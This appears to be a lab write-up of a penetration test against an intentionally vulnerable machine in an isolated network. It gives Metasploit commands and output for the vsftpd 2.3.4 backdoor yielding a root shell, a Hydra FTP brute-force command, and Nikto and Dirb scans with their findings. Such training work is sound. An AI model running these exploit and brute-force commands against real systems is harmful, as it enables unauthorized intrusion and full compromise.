# 💥 Attack Documentation

## 1. Metasploit — vsftpd 2.3.4 Backdoor

### Vulnerability
CVE-2011-2523 — vsftpd 2.3.4 contains a backdoor introduced via a malicious code commit. Connecting to port 21 with a username containing `:)` triggers a root shell on port 6200.

### Exploit
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.103
run
```

### Result
```
[*] 192.168.1.103:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.103:21 - USER: 331 Please specify the password.
[*] 192.168.1.103:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.103:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
    (192.168.1.101:43993 → 192.168.1.103:6200)
```

✅ **Root shell obtained** — full system compromise demonstrated.

---

## 2. Hydra — FTP Brute Force

### Command
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.103
```

### Result
```
Hydra v9.6 starting at 2026-03-05 10:39:31
[DATA] max 16 tasks per server
[DATA] 14,344,399 login tries (l:1/p:14344399)
[DATA] attacking ftp://192.168.1.103:21/
```

Attack demonstrated brute force capability against FTP service using rockyou.txt wordlist.

---

## 3. Nikto — Web Vulnerability Scan

### Command
```bash
nikto -h http://192.168.1.103
```

### Key Findings
| Finding | Severity | Description |
|---------|---------|-------------|
| Apache 2.2.8 outdated | High | EOL version, multiple CVEs |
| X-Frame-Options missing | Medium | Clickjacking vulnerability |
| X-Content-Type-Options missing | Low | MIME sniffing risk |
| HTTP TRACE enabled | Medium | XST (Cross-Site Tracing) attack vector |
| phpinfo.php exposed | High | Server configuration disclosure |
| Directory indexing enabled | Medium | File listing on /doc/ |
| PHP 5.2.4 detected | High | Outdated PHP version |

---

## 4. Dirb — Directory Enumeration

### Command
```bash
dirb http://192.168.1.103
```

### Discovered Paths
| Path | Code | Notes |
|------|------|-------|
| /cgi-bin/ | 403 | Forbidden but exists |
| /dav/ | 200 | WebDAV enabled |
| /index.php | 200 | Main page |
| /phpinfo.php | 200 | ⚠️ PHP config exposed |
| /phpMyAdmin/ | 200 | ⚠️ Database admin panel |
| /server-status | 403 | Apache status page |
| /test/ | 200 | Test directory |

> **Critical:** phpMyAdmin and WebDAV accessible without authentication — major attack vectors.

---

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| Port/Service Scan | Nmap | 23 open ports, multiple vulnerable services |
| FTP Backdoor Exploit | Metasploit | ✅ Root shell obtained |
| FTP Brute Force | Hydra | Attack launched, 14M+ attempts |
| Web Vulnerability Scan | Nikto | 10+ vulnerabilities found |
| Directory Enumeration | Dirb | phpMyAdmin, WebDAV, phpinfo exposed |

All attacks were conducted in an isolated virtual environment against an intentionally vulnerable machine for educational purposes only.
